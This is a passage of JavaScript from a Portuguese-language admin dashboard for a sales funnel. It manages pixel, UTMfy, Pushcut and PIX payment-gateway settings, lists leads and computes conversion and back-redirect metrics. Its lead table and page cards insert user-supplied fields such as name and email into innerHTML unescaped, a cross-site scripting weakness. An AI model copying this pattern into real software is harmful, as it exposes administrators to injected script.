        const active = normalizeGatewayKey(gateway);
        gatewayCards.forEach((card) => {
            const cardGateway = normalizeGatewayKey(card.getAttribute('data-gateway-card'));
            card.classList.toggle('is-current', cardGateway === active);
        });
    };

    const setGatewayCardOpen = (gateway, shouldOpen = true) => {
        const target = normalizeGatewayKey(gateway);
        gatewayCards.forEach((card) => {
            const cardGateway = normalizeGatewayKey(card.getAttribute('data-gateway-card'));
            const isOpen = shouldOpen && cardGateway === target;
            card.classList.toggle('is-open', isOpen);
            const toggleButton = card.querySelector('[data-gateway-config-toggle]');
            if (toggleButton) {
                toggleButton.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
                toggleButton.textContent = isOpen ? 'Fechar' : 'Configurar';
            }
        });
    };

    const toggleGatewayCard = (gateway) => {
        const target = normalizeGatewayKey(gateway);
        const current = gatewayCards.find((card) => normalizeGatewayKey(card.getAttribute('data-gateway-card')) === target);
        const shouldOpen = !(current && current.classList.contains('is-open'));
        setGatewayCardOpen(target, shouldOpen);
    };

    const setLoginVisible = (visible) => {
        if (loginWrap) loginWrap.classList.toggle('hidden', !visible);
        if (panelWrap) panelWrap.classList.toggle('hidden', visible);
    };

    const adminFetch = async (url, options = {}) => {
        const res = await fetch(url, {
            credentials: 'same-origin',
            headers: { 'Content-Type': 'application/json' },
            ...options
        });
        return res;
    };

    const checkAuth = async () => {
        const res = await adminFetch('/api/admin/me');
        return res.ok;
    };

    const loadSettings = async () => {
        const res = await adminFetch('/api/admin/settings');
        if (!res.ok) return;
        const data = await res.json();
        currentSettings = data || {};

        if (hasPixelForm) {
            if (pixelEnabled) pixelEnabled.checked = !!data.pixel?.enabled;
            if (pixelId) pixelId.value = data.pixel?.id || '';
            if (pixelEventPage) pixelEventPage.checked = data.pixel?.events?.page_view !== false;
            if (pixelEventQuiz) pixelEventQuiz.checked = data.pixel?.events?.quiz_view !== false;
            if (pixelEventLead) pixelEventLead.checked = data.pixel?.events?.lead !== false;
            if (pixelEventCheckout) pixelEventCheckout.checked = data.pixel?.events?.checkout !== false;
            if (pixelEventPurchase) pixelEventPurchase.checked = data.pixel?.events?.purchase !== false;
            if (pixelCapiEnabled) pixelCapiEnabled.checked = !!data.pixel?.capi?.enabled;
            if (pixelCapiToken) pixelCapiToken.value = data.pixel?.capi?.accessToken || '';
            if (pixelCapiTestCode) pixelCapiTestCode.value = data.pixel?.capi?.testEventCode || '';
        }

        if (hasUtmfyForm) {
            if (utmfyEnabled) utmfyEnabled.checked = !!data.utmfy?.enabled;
            if (utmfyEndpoint) utmfyEndpoint.value = data.utmfy?.endpoint || '';
            if (utmfyApi) utmfyApi.value = data.utmfy?.apiKey || '';
            if (pushcutEnabled) pushcutEnabled.checked = !!data.pushcut?.enabled;
            if (pushcutPixCreated) pushcutPixCreated.value = data.pushcut?.pixCreatedUrl || data.pushcut?.pixCreatedUrls?.[0] || '';
            if (pushcutPixCreated2) pushcutPixCreated2.value = data.pushcut?.pixCreatedUrl2 || data.pushcut?.pixCreatedUrls?.[1] || '';
            if (pushcutPixConfirmed) pushcutPixConfirmed.value = data.pushcut?.pixConfirmedUrl || data.pushcut?.pixConfirmedUrls?.[0] || '';
            if (pushcutPixConfirmed2) pushcutPixConfirmed2.value = data.pushcut?.pixConfirmedUrl2 || data.pushcut?.pixConfirmedUrls?.[1] || '';
            if (pushcutCreatedTitle) pushcutCreatedTitle.value = data.pushcut?.templates?.pixCreatedTitle || '';
            if (pushcutCreatedMessage) pushcutCreatedMessage.value = data.pushcut?.templates?.pixCreatedMessage || '';
            if (pushcutConfirmedTitle) pushcutConfirmedTitle.value = data.pushcut?.templates?.pixConfirmedTitle || '';
            if (pushcutConfirmedMessage) pushcutConfirmedMessage.value = data.pushcut?.templates?.pixConfirmedMessage || '';
        }

        if (hasPaymentsForm) {
            const payments = data.payments || {};
            const gateways = payments.gateways || {};
            const ativushub = gateways.ativushub || {};
            const ghostspay = gateways.ghostspay || {};
            const sunize = gateways.sunize || {};
            const paradise = gateways.paradise || {};
            const activeGateway = normalizeGatewayKey(payments.activeGateway || 'ativushub');

            if (paymentsActiveGateway) paymentsActiveGateway.value = activeGateway;
            if (gatewayAtivushubEnabled) gatewayAtivushubEnabled.checked = ativushub.enabled !== false;
            if (gatewayAtivushubBaseUrl) gatewayAtivushubBaseUrl.value = ativushub.baseUrl || '';
            if (gatewayAtivushubApiKey) gatewayAtivushubApiKey.value = ativushub.apiKey || ativushub.apiKeyBase64 || '';
            if (gatewayAtivushubSellerId) gatewayAtivushubSellerId.value = ativushub.sellerId || '';
            if (gatewayAtivushubWebhookToken) gatewayAtivushubWebhookToken.value = ativushub.webhookToken || '';

            if (gatewayGhostspayEnabled) gatewayGhostspayEnabled.checked = !!ghostspay.enabled;
            if (gatewayGhostspayBaseUrl) gatewayGhostspayBaseUrl.value = ghostspay.baseUrl || '';
            if (gatewayGhostspaySecretKey) gatewayGhostspaySecretKey.value = ghostspay.secretKey || '';
            if (gatewayGhostspayCompanyId) gatewayGhostspayCompanyId.value = ghostspay.companyId || '';
            if (gatewayGhostspayWebhookToken) gatewayGhostspayWebhookToken.value = ghostspay.webhookToken || '';
            if (gatewaySunizeEnabled) gatewaySunizeEnabled.checked = !!sunize.enabled;
            if (gatewaySunizeBaseUrl) gatewaySunizeBaseUrl.value = sunize.baseUrl || '';
            if (gatewaySunizeApiKey) gatewaySunizeApiKey.value = sunize.apiKey || '';
            if (gatewaySunizeApiSecret) gatewaySunizeApiSecret.value = sunize.apiSecret || '';
            if (gatewayParadiseEnabled) gatewayParadiseEnabled.checked = !!paradise.enabled;
            if (gatewayParadiseBaseUrl) gatewayParadiseBaseUrl.value = paradise.baseUrl || '';
            if (gatewayParadiseApiKey) gatewayParadiseApiKey.value = paradise.apiKey || '';
            if (gatewayParadiseProductHash) gatewayParadiseProductHash.value = paradise.productHash || '';
            if (gatewayParadiseOrderbumpHash) gatewayParadiseOrderbumpHash.value = paradise.orderbumpHash || '';
            if (gatewayParadiseSource) gatewayParadiseSource.value = paradise.source || '';
            if (gatewayParadiseDescription) gatewayParadiseDescription.value = paradise.description || '';

            syncGatewaySwitches();
            setCurrentGatewayCard(activeGateway);
            setGatewayCardOpen(activeGateway, true);

            if (metricActiveGateway) {
                metricActiveGateway.textContent = gatewayLabelForUi(activeGateway);
            }
        }

        if (hasFeatureForm) {
            featureOrderbump.checked = data.features?.orderbump !== false;
        }
    };

    const saveSettings = async () => {
        if (!saveBtn) return;
        saveBtn.disabled = true;
        if (saveStatus) saveStatus.textContent = 'Salvando...';

        const payload = {
            ...(currentSettings || {})
        };

        if (hasPixelForm) {
            payload.pixel = {
                ...(currentSettings?.pixel || {}),
                enabled: !!pixelEnabled?.checked,
                id: pixelId?.value?.trim() || '',
                events: {
                    ...(currentSettings?.pixel?.events || {}),
                    page_view: pixelEventPage?.checked !== false,
                    quiz_view: pixelEventQuiz?.checked !== false,
                    lead: pixelEventLead?.checked !== false,
                    purchase: pixelEventPurchase?.checked !== false,
                    checkout: pixelEventCheckout?.checked !== false
                },
                capi: {
                    ...(currentSettings?.pixel?.capi || {}),
                    enabled: !!pixelCapiEnabled?.checked,
                    accessToken: pixelCapiToken?.value?.trim() || '',
                    testEventCode: pixelCapiTestCode?.value?.trim() || ''
                }
            };
        }

        if (hasUtmfyForm) {
            payload.utmfy = {
                ...(currentSettings?.utmfy || {}),
                enabled: !!utmfyEnabled?.checked,
                endpoint: utmfyEndpoint?.value?.trim() || '',
                apiKey: utmfyApi?.value?.trim() || ''
            };
            const createdUrls = [
                pushcutPixCreated?.value?.trim() || '',
                pushcutPixCreated2?.value?.trim() || ''
            ].filter(Boolean);
            const confirmedUrls = [
                pushcutPixConfirmed?.value?.trim() || '',
                pushcutPixConfirmed2?.value?.trim() || ''
            ].filter(Boolean);
            payload.pushcut = {
                ...(currentSettings?.pushcut || {}),
                enabled: !!pushcutEnabled?.checked,
                pixCreatedUrl: createdUrls[0] || '',
                pixCreatedUrl2: createdUrls[1] || '',
                pixCreatedUrls: createdUrls,
                pixConfirmedUrl: confirmedUrls[0] || '',
                pixConfirmedUrl2: confirmedUrls[1] || '',
                pixConfirmedUrls: confirmedUrls,
                templates: {
                    ...(currentSettings?.pushcut?.templates || {}),
                    pixCreatedTitle: pushcutCreatedTitle?.value?.trim() || '',
                    pixCreatedMessage: pushcutCreatedMessage?.value?.trim() || '',
                    pixConfirmedTitle: pushcutConfirmedTitle?.value?.trim() || '',
                    pixConfirmedMessage: pushcutConfirmedMessage?.value?.trim() || ''
                }
            };
        }

        if (hasPaymentsForm) {
            const activeGateway = normalizeGatewayKey(paymentsActiveGateway?.value || 'ativushub');
            payload.payments = {
                ...(currentSettings?.payments || {}),
                activeGateway,
                gateways: {
                    ...(currentSettings?.payments?.gateways || {}),
                    ativushub: {
                        ...(currentSettings?.payments?.gateways?.ativushub || {}),
                        enabled: gatewayAtivushubEnabled?.checked !== false,
                        baseUrl: gatewayAtivushubBaseUrl?.value?.trim() || '',
                        apiKey: gatewayAtivushubApiKey?.value?.trim() || '',
                        sellerId: gatewayAtivushubSellerId?.value?.trim() || '',
                        webhookToken: gatewayAtivushubWebhookToken?.value?.trim() || ''
                    },
                    ghostspay: {
                        ...(currentSettings?.payments?.gateways?.ghostspay || {}),
                        enabled: !!gatewayGhostspayEnabled?.checked,
                        baseUrl: gatewayGhostspayBaseUrl?.value?.trim() || '',
                        secretKey: gatewayGhostspaySecretKey?.value?.trim() || '',
                        companyId: gatewayGhostspayCompanyId?.value?.trim() || '',
                        webhookToken: gatewayGhostspayWebhookToken?.value?.trim() || ''
                    },
                    sunize: {
                        ...(currentSettings?.payments?.gateways?.sunize || {}),
                        enabled: !!gatewaySunizeEnabled?.checked,
                        baseUrl: gatewaySunizeBaseUrl?.value?.trim() || '',
                        apiKey: gatewaySunizeApiKey?.value?.trim() || '',
                        apiSecret: gatewaySunizeApiSecret?.value?.trim() || ''
                    },
                    paradise: {
                        ...(currentSettings?.payments?.gateways?.paradise || {}),
                        enabled: !!gatewayParadiseEnabled?.checked,
                        baseUrl: gatewayParadiseBaseUrl?.value?.trim() || '',
                        apiKey: gatewayParadiseApiKey?.value?.trim() || '',
                        productHash: gatewayParadiseProductHash?.value?.trim() || '',
                        orderbumpHash: gatewayParadiseOrderbumpHash?.value?.trim() || '',
                        source: gatewayParadiseSource?.value?.trim() || '',
                        description: gatewayParadiseDescription?.value?.trim() || ''
                    }
                }
            };
        }

        if (hasFeatureForm) {
            payload.features = {
                ...(currentSettings?.features || {}),
                orderbump: featureOrderbump?.checked !== false
            };
        }

        const res = await adminFetch('/api/admin/settings', {
            method: 'POST',
            body: JSON.stringify(payload)
        });

        if (saveStatus) {
            saveStatus.textContent = res.ok ? 'Configuracoes salvas.' : 'Falha ao salvar.';
            setTimeout(() => {
                if (saveStatus) saveStatus.textContent = '';
            }, 2500);
        }
        if (res.ok && hasPaymentsForm) {
            const activeGateway = normalizeGatewayKey(paymentsActiveGateway?.value || 'ativushub');
            setCurrentGatewayCard(activeGateway);
            syncGatewaySwitches();
            if (metricActiveGateway) {
                metricActiveGateway.textContent = gatewayLabelForUi(activeGateway);
            }
        }
        saveBtn.disabled = false;
    };

    const runPixelTest = async () => {
        if (testPixelStatus) testPixelStatus.textContent = 'Enviando evento...';
        const pixel = await ensurePixelConfig(true);
        if (!pixel?.enabled || !pixel.id) {
            if (testPixelStatus) testPixelStatus.textContent = 'Pixel desativado ou sem ID.';
            showToast('Pixel nao configurado.', 'error');
            return;
        }
        loadFacebookPixel(pixel.id);
        firePixelEvent('Lead', { source: 'admin_test' });
        if (testPixelStatus) testPixelStatus.textContent = 'Evento Lead enviado.';
        showToast('Evento teste enviado ao Pixel.', 'success');
    };

    const runUtmfyTest = async () => {
        if (!utmfyEnabled?.checked || !(utmfyEndpoint?.value || '').trim()) {
            if (testUtmfyStatus) testUtmfyStatus.textContent = 'Configure e salve o endpoint antes do teste.';
            showToast('Configure o UTMfy e salve.', 'error');
            return;
        }
        if (testUtmfyStatus) testUtmfyStatus.textContent = 'Enviando evento...';
        const res = await adminFetch('/api/admin/utmfy-test', { method: 'POST' });
        if (!res.ok) {
            const detail = await res.json().catch(() => ({}));
            const reason =
                detail?.detail?.reason ||
                detail?.reason ||
                detail?.detail?.detail ||
                detail?.detail ||
                detail?.error ||
                'Falha ao enviar.';
            if (testUtmfyStatus) testUtmfyStatus.textContent = reason;
            showToast('Falha ao enviar evento UTMfy.', 'error');
            return;
        }
        if (testUtmfyStatus) testUtmfyStatus.textContent = 'Evento teste enviado.';
        showToast('Evento teste enviado ao UTMfy.', 'success');
    };

    const runUtmfySale = async () => {
        if (!utmfyEnabled?.checked || !(utmfyEndpoint?.value || '').trim()) {
            if (saleUtmfyStatus) saleUtmfyStatus.textContent = 'Configure e salve o endpoint antes do envio.';
            showToast('Configure o UTMfy e salve.', 'error');
            return;
        }
        if (saleUtmfyStatus) saleUtmfyStatus.textContent = 'Enviando venda...';
        const res = await adminFetch('/api/admin/utmfy-sale', { method: 'POST' });
        if (!res.ok) {
            const detail = await res.json().catch(() => ({}));
            const reason =
                detail?.detail?.reason ||
                detail?.reason ||
                detail?.detail?.detail ||
                detail?.detail ||
                detail?.error ||
                'Falha ao enviar.';
            if (saleUtmfyStatus) saleUtmfyStatus.textContent = reason;
            showToast('Falha ao enviar venda UTMfy.', 'error');
            return;
        }
        if (saleUtmfyStatus) saleUtmfyStatus.textContent = 'Venda enviada.';
        showToast('Venda enviada ao UTMfy.', 'success');
    };

    const runPushcutTest = async () => {
        if (!pushcutEnabled?.checked) {
            if (testPushcutStatus) testPushcutStatus.textContent = 'Ative o Pushcut e salve antes do teste.';
            showToast('Ative o Pushcut e salve.', 'error');
            return;
        }
        const hasCreated = !!(pushcutPixCreated?.value || '').trim() || !!(pushcutPixCreated2?.value || '').trim();
        const hasConfirmed = !!(pushcutPixConfirmed?.value || '').trim() || !!(pushcutPixConfirmed2?.value || '').trim();
        if (!hasCreated && !hasConfirmed) {
            if (testPushcutStatus) testPushcutStatus.textContent = 'Informe ao menos uma URL de Pushcut.';
            showToast('Configure a URL de Pushcut.', 'error');
            return;
        }

        if (testPushcutStatus) testPushcutStatus.textContent = 'Enviando teste...';
        const res = await adminFetch('/api/admin/pushcut-test', { method: 'POST' });
        const data = await res.json().catch(() => ({}));

        if (!res.ok || !data?.ok) {
            const reason = data?.error || data?.detail?.reason || 'Falha ao testar Pushcut.';
            if (testPushcutStatus) testPushcutStatus.textContent = reason;
            showToast('Falha no teste do Pushcut.', 'error');
            return;
        }

        const createdOk = !!data?.results?.pix_created?.ok;
        const confirmedOk = !!data?.results?.pix_confirmed?.ok;
        const createdSent = Number(data?.results?.pix_created?.sent || (createdOk ? 1 : 0));
        const createdTotal = Number(data?.results?.pix_created?.total || (createdOk ? 1 : 0));
        const confirmedSent = Number(data?.results?.pix_confirmed?.sent || (confirmedOk ? 1 : 0));
        const confirmedTotal = Number(data?.results?.pix_confirmed?.total || (confirmedOk ? 1 : 0));
        if (testPushcutStatus) {
            testPushcutStatus.textContent = `PIX criado: ${createdSent}/${createdTotal} | PIX confirmado: ${confirmedSent}/${confirmedTotal}`;
        }
        showToast('Teste do Pushcut enviado.', 'success');
    };

    const runDispatchProcess = async () => {
        if (processDispatchStatus) processDispatchStatus.textContent = 'Processando fila...';
        const res = await adminFetch('/api/admin/dispatch-process', { method: 'POST' });
        const data = await res.json().catch(() => ({}));
        if (!res.ok || !data?.ok) {
            const reason = data?.error || data?.detail?.reason || 'Falha ao processar fila.';
            if (processDispatchStatus) processDispatchStatus.textContent = reason;
            showToast('Falha ao processar fila.', 'error');
            return;
        }
        if (processDispatchStatus) {
            processDispatchStatus.textContent = `Processados ${data.processed || 0}, sucesso ${data.succeeded || 0}, falha ${data.failed || 0}.`;
        }
        showToast('Fila processada com sucesso.', 'success');
    };

    const renderLeads = (rows, append = false) => {
        if (!leadsBody) return;
        if (!append) leadsBody.innerHTML = '';

        rows.forEach((row) => {
            const tr = document.createElement('tr');
            const ev = String(row.evento || '').toLowerCase().trim();
            const isPaid = row.is_paid === true || ev === 'pix_confirmed' || ev === 'pagamento_confirmado' || ev === 'paid';
            const rawStatus = String(row.status_funil || row.evento || '').toLowerCase().trim();
            const isPixGenerated = (
                rawStatus === 'pix_gerado' ||
                rawStatus === 'pix_created' ||
                rawStatus === 'pix_pending' ||
                rawStatus === 'waiting_payment' ||
                rawStatus === 'aguardando_pagamento'
            );
            const statusLabel = isPaid ? 'pagamento_confirmado' : (row.status_funil || row.evento || '-');
            const statusClass = isPaid
                ? 'status-pill--paid'
                : (isPixGenerated ? 'status-pill--pix-created' : 'status-pill--neutral');
            tr.innerHTML = `
                <td>${row.nome || '-'}</td>
                <td>${row.email || '-'}</td>
                <td>${row.telefone || '-'}</td>
                <td>${row.utm_source || '-'}</td>
                <td>${row.etapa || '-'}</td>
                <td><span class="status-pill ${statusClass}">${statusLabel}</span></td>
                <td>${row.frete || '-'}</td>
                <td>${row.valor_total ? formatCurrency(row.valor_total) : '-'}</td>
                <td>${formatDateTime(row.event_time || row.updated_at)}</td>
            `;
            leadsBody.appendChild(tr);
        });

        if (leadsCount) leadsCount.textContent = String(offset + rows.length);
    };

    const updateMetrics = (rows, reset = false, summary = null) => {
        const emptyGatewayStats = () => ({
            ativushub: { leads: 0, pix: 0, paid: 0, refunded: 0, refused: 0, pending: 0 },
            ghostspay: { leads: 0, pix: 0, paid: 0, refunded: 0, refused: 0, pending: 0 },
            sunize: { leads: 0, pix: 0, paid: 0, refunded: 0, refused: 0, pending: 0 },
            paradise: { leads: 0, pix: 0, paid: 0, refunded: 0, refused: 0, pending: 0 }
        });

        if (summary && typeof summary === 'object') {
            metrics.total = Number(summary.total || 0);
            metrics.pix = Number(summary.pix || 0);
            metrics.frete = Number(summary.frete || 0);
            metrics.cep = Number(summary.cep || 0);
            metrics.paid = Number(summary.paid || 0);
            metrics.lastUpdated = String(summary.lastUpdated || '');
            const source = summary.gatewayStats || {};
            const base = emptyGatewayStats();
            metrics.gatewayStats = {
                ativushub: {
                    ...base.ativushub,
                    ...(source.ativushub || {})
                },
                ghostspay: {
                    ...base.ghostspay,
                    ...(source.ghostspay || {})
                },
                sunize: {
                    ...base.sunize,
                    ...(source.sunize || {})
                },
                paradise: {
                    ...base.paradise,
                    ...(source.paradise || {})
                }
            };
        } else {
        if (reset) {
            metrics.total = 0;
            metrics.pix = 0;
            metrics.frete = 0;
            metrics.cep = 0;
            metrics.paid = 0;
            metrics.lastUpdated = '';
            metrics.gatewayStats = emptyGatewayStats();
        }

        metrics.total += rows.length;
        rows.forEach((row) => {
            const cep = String(row.cep || '').trim();
            const frete = String(row.frete || '').trim();
            const pixTxid = String(row.pix_txid || '').trim();
            const ev = String(row.evento || '').toLowerCase().trim();
            const gateway = normalizeGatewayKey(row.gateway || 'ativushub');
            const gatewayStats = metrics.gatewayStats[gateway];

            gatewayStats.leads += 1;
            if (pixTxid && pixTxid !== '-') metrics.pix += 1;
            if (pixTxid && pixTxid !== '-') gatewayStats.pix += 1;
            if (frete && frete !== '-') metrics.frete += 1;
            if (cep && cep !== '-') metrics.cep += 1;
            const isPaid = row.is_paid === true || ev === 'pix_confirmed' || ev === 'pagamento_confirmado' || ev === 'paid';
            if (isPaid) metrics.paid += 1;
            if (isPaid) gatewayStats.paid += 1;
            else if (ev === 'pix_refunded') gatewayStats.refunded += 1;
            else if (ev === 'pix_refused' || ev === 'pix_failed') gatewayStats.refused += 1;
            else if (ev === 'pix_pending' || ev === 'pix_created') gatewayStats.pending += 1;
            if (!metrics.lastUpdated && (row.event_time || row.updated_at)) metrics.lastUpdated = row.event_time || row.updated_at;
        });
        }

        if (metricTotal) metricTotal.textContent = String(metrics.total);
        if (metricPix) metricPix.textContent = String(metrics.paid);
        if (metricFrete) metricFrete.textContent = String(metrics.frete);
        if (metricCep) metricCep.textContent = String(metrics.cep);
        if (metricUpdated) {
            metricUpdated.textContent = formatDateTime(metrics.lastUpdated);
        }
        if (metricBase) metricBase.textContent = `Base: ${metrics.total}`;

        const total = metrics.total || 0;
        const pctPix = total ? Math.round((metrics.paid / total) * 100) : 0;
        const pctFrete = total ? Math.round((metrics.frete / total) * 100) : 0;
        const pctCep = total ? Math.round((metrics.cep / total) * 100) : 0;

        if (metricConvPix) metricConvPix.textContent = `${pctPix}%`;
        if (metricConvFrete) metricConvFrete.textContent = `${pctFrete}%`;
        if (metricConvCep) metricConvCep.textContent = `${pctCep}%`;
        if (funnelPix) funnelPix.style.width = `${pctPix}%`;
        if (funnelFrete) funnelFrete.style.width = `${pctFrete}%`;
        if (funnelCep) funnelCep.style.width = `${pctCep}%`;
        if (funnelPixValue) funnelPixValue.textContent = `${pctPix}%`;
        if (funnelFreteValue) funnelFreteValue.textContent = `${pctFrete}%`;
        if (funnelCepValue) funnelCepValue.textContent = `${pctCep}%`;

        const ativusStats = metrics.gatewayStats.ativushub || { pix: 0, paid: 0 };
        const ghostStats = metrics.gatewayStats.ghostspay || { pix: 0, paid: 0 };
        const sunizeStats = metrics.gatewayStats.sunize || { pix: 0, paid: 0 };
        const paradiseStats = metrics.gatewayStats.paradise || { pix: 0, paid: 0 };
        const ativusConv = ativusStats.pix ? Math.round((Number(ativusStats.paid || 0) / Number(ativusStats.pix || 0)) * 100) : 0;
        const ghostConv = ghostStats.pix ? Math.round((Number(ghostStats.paid || 0) / Number(ghostStats.pix || 0)) * 100) : 0;
        const sunizeConv = sunizeStats.pix ? Math.round((Number(sunizeStats.paid || 0) / Number(sunizeStats.pix || 0)) * 100) : 0;
        const paradiseConv = paradiseStats.pix ? Math.round((Number(paradiseStats.paid || 0) / Number(paradiseStats.pix || 0)) * 100) : 0;

        if (metricGatewayAtivushubConv) metricGatewayAtivushubConv.textContent = `${ativusConv}%`;
        if (metricGatewayAtivushubDetail) {
            metricGatewayAtivushubDetail.textContent = `${Number(ativusStats.paid || 0)} pagos / ${Number(ativusStats.pix || 0)} PIX`;
        }
        if (metricGatewayGhostspayConv) metricGatewayGhostspayConv.textContent = `${ghostConv}%`;
        if (metricGatewayGhostspayDetail) {
            metricGatewayGhostspayDetail.textContent = `${Number(ghostStats.paid || 0)} pagos / ${Number(ghostStats.pix || 0)} PIX`;
        }
        if (metricGatewaySunizeConv) metricGatewaySunizeConv.textContent = `${sunizeConv}%`;
        if (metricGatewaySunizeDetail) {
            metricGatewaySunizeDetail.textContent = `${Number(sunizeStats.paid || 0)} pagos / ${Number(sunizeStats.pix || 0)} PIX`;
        }
        if (metricGatewayParadiseConv) metricGatewayParadiseConv.textContent = `${paradiseConv}%`;
        if (metricGatewayParadiseDetail) {
            metricGatewayParadiseDetail.textContent = `${Number(paradiseStats.paid || 0)} pagos / ${Number(paradiseStats.pix || 0)} PIX`;
        }

        if (metricBestGateway) {
            const options = [
                { label: 'AtivusHUB', conv: ativusConv, paid: Number(ativusStats.paid || 0), pix: Number(ativusStats.pix || 0) },
                { label: 'GhostsPay', conv: ghostConv, paid: Number(ghostStats.paid || 0), pix: Number(ghostStats.pix || 0) },
                { label: 'Sunize', conv: sunizeConv, paid: Number(sunizeStats.paid || 0), pix: Number(sunizeStats.pix || 0) },
                { label: 'Paradise', conv: paradiseConv, paid: Number(paradiseStats.paid || 0), pix: Number(paradiseStats.pix || 0) }
            ].filter((item) => item.pix > 0);
            if (!options.length) {
                metricBestGateway.textContent = '-';
            } else {
                options.sort((a, b) => {
                    if (b.conv !== a.conv) return b.conv - a.conv;
                    if (b.paid !== a.paid) return b.paid - a.paid;
                    return b.pix - a.pix;
                });
                metricBestGateway.textContent = `${options[0].label} (${options[0].conv}%)`;
            }
        }
    };

    const loadLeads = async ({ reset = false } = {}) => {
        if (loadingLeads) return;
        loadingLeads = true;
        if (reset) {
            offset = 0;
        }

        const query = leadsSearch?.value.trim() || '';
        const url = new URL('/api/admin/leads', window.location.origin);
        url.searchParams.set('limit', String(limit));
        url.searchParams.set('offset', String(offset));
        if (query) url.searchParams.set('q', query);
        if (metricTotal) url.searchParams.set('summary', '1');

        const res = await adminFetch(url.toString());
        if (res.ok) {
            const data = await res.json();
            const rows = data.data || [];
            renderLeads(rows, !reset);
            updateMetrics(rows, reset, data.summary || null);
            offset += rows.length;
        }
        loadingLeads = false;
    };

    const reconcilePix = async () => {
        if (!leadsReconcile) return;
        leadsReconcile.disabled = true;
        if (leadsReconcileStatus) leadsReconcileStatus.textContent = 'Verificando pagamentos...';
        const res = await adminFetch('/api/admin/pix-reconcile', { method: 'POST' });
        if (!res.ok) {
            const detail = await res.json().catch(() => ({}));
            if (leadsReconcileStatus) {
                const extra = detail?.detail ? ` (${typeof detail.detail === 'string' ? detail.detail : JSON.stringify(detail.detail).slice(0, 180)})` : '';
                leadsReconcileStatus.textContent = `${detail?.error || 'Falha ao reconciliar.'}${extra}`;
            }
            showToast('Falha ao reconciliar PIX.', 'error');
            leadsReconcile.disabled = false;
            return;
        }
        const data = await res.json().catch(() => ({}));
        if (leadsReconcileStatus) {
            const blocked = Number(data.blockedByAtivus || 0);
            const warning = blocked ? ` Bloqueados Ativus: ${blocked}.` : '';
            leadsReconcileStatus.textContent = `Checados ${data.checked || 0}, confirmados ${data.confirmed || 0}, atualizados ${data.updated || 0}.${warning}`;
        }
        if (data.warning) showToast(data.warning, 'error');
        showToast('Reconciliacao finalizada.', 'success');
        leadsReconcile.disabled = false;
        loadLeads({ reset: true });
    };

    const loadPageCounts = async () => {
        if (!pagesGrid) return;
        const res = await adminFetch('/api/admin/pages');
        if (!res.ok) return;
        const data = await res.json();
        const rows = (data.data || []).filter((row) => !String(row?.page || '').startsWith('backredirect_'));
        const max = rows.reduce((acc, row) => Math.max(acc, Number(row.total) || 0), 0) || 1;
        pagesGrid.innerHTML = '';
        rows.forEach((row) => {
            const card = document.createElement('div');
            card.className = 'admin-page-card';
            const pct = Math.round(((Number(row.total) || 0) / max) * 100);
            card.innerHTML = `
                <strong>${row.total ?? 0}</strong>
                <span>${row.page || '-'}</span>
                <div class="admin-page-bar"><i style="width: ${pct}%"></i></div>
            `;
            pagesGrid.appendChild(card);
        });

        if (pagesInsights) {
            const order = ['home', 'quiz', 'personal', 'cep', 'processing', 'success', 'checkout', 'orderbump', 'pix', 'upsell'];
            const map = new Map(rows.map((r) => [r.page, Number(r.total) || 0]));
            pagesInsights.innerHTML = '';
            let prevEffective = null;
            order.forEach((page, index) => {
                if (!map.has(page)) return;
                const current = map.get(page);
                const prev = prevEffective ?? current;
                const carried = Math.min(current, prev);
                const conv = prev ? Math.round((carried / prev) * 100) : 0;
                const drop = prev ? Math.max(0, prev - carried) : 0;
                const direct = Math.max(0, current - prev);
                const meta = funnelPageMeta[page] || { label: page, desc: 'Etapa do funil' };
                const card = document.createElement('div');
                card.className = 'admin-insight-card';
                card.innerHTML = `
                    <span class="admin-insight-pill">${meta.label}</span>
                    <span class="admin-insight-count">Cliques: ${current}</span>
                    <strong>${conv}%</strong>
                    <span>Conversao vs etapa anterior</span>
                    <span>Queda: ${prev ? Math.round((drop / prev) * 100) : 0}%</span>
                    ${direct ? `<span>Entrada direta: ${direct}</span>` : ''}
                    <span>${meta.desc}</span>
                `;
                pagesInsights.appendChild(card);
                prevEffective = carried;
            });
        }
    };

    const loadBackredirects = async () => {
        if (!backredirectGrid) return;
        const res = await adminFetch('/api/admin/backredirects');
        if (!res.ok) return;
        const payload = await res.json().catch(() => ({}));
        const rows = Array.isArray(payload?.data) ? payload.data : [];
        const summary = payload?.summary || {};
        const totalBack = Number(summary.totalBack || 0);

        if (backredirectTotal) {
            backredirectTotal.textContent = String(totalBack);
        }

        if (backredirectTopPage) {
            backredirectTopPage.textContent = rows[0]?.page ? (funnelPageMeta[rows[0].page]?.label || rows[0].page) : '-';
        }
        if (backredirectTopRate) {
            const rate = Number(rows[0]?.rate || 0);
            backredirectTopRate.textContent = `${rate.toFixed(1)}%`;
        }

        if (backredirectGrid) {
            backredirectGrid.innerHTML = '';
            const max = rows.reduce((acc, row) => Math.max(acc, Number(row.backTotal) || 0), 0) || 1;
            rows.forEach((row) => {
                const page = String(row.page || '').trim();
                const meta = funnelPageMeta[page] || { label: `${page || '-'}.html`, desc: 'Etapa do funil' };
                const backTotal = Number(row.backTotal || 0);
                const pageViews = Number(row.pageViews || 0);
                const rate = Number(row.rate || 0);
                const pct = Math.round((backTotal / max) * 100);
                const card = document.createElement('div');
                card.className = 'admin-page-card';
                card.innerHTML = `
                    <strong>${backTotal}</strong>
                    <span>${meta.label}</span>
                    <div class="admin-page-bar"><i style="width: ${pct}%"></i></div>
                    <span>Taxa de voltar: ${rate.toFixed(1)}%</span>
                    <span>Pageviews: ${pageViews}</span>
                    <span>${meta.desc}</span>
                `;
                backredirectGrid.appendChild(card);
            });
            if (!rows.length) {
                const empty = document.createElement('div');
                empty.className = 'admin-insight-card';
                empty.innerHTML = '<strong>Sem dados ainda</strong><span>Assim que houver clique em voltar, os cards aparecem aqui.</span>';
                backredirectGrid.appendChild(empty);
            }
        }

        if (backredirectInsights) {
            backredirectInsights.innerHTML = '';
            rows.slice(0, 6).forEach((row, index) => {
                const page = String(row.page || '').trim();
                const meta = funnelPageMeta[page] || { label: page || '-', desc: 'Etapa do funil' };
                const card = document.createElement('div');
                card.className = 'admin-insight-card';
                card.innerHTML = `
                    <span class="admin-insight-pill">#${index + 1} ${meta.label}</span>
                    <span class="admin-insight-count">${Number(row.backTotal || 0)} leads clicaram voltar</span>
                    <strong>${Number(row.rate || 0).toFixed(1)}%</strong>
                    <span>Taxa de voltar vs pageviews da etapa</span>
                    <span>${meta.desc}</span>
                `;
                backredirectInsights.appendChild(card);
            });
        }
    };

    loginBtn?.addEventListener('click', async () => {
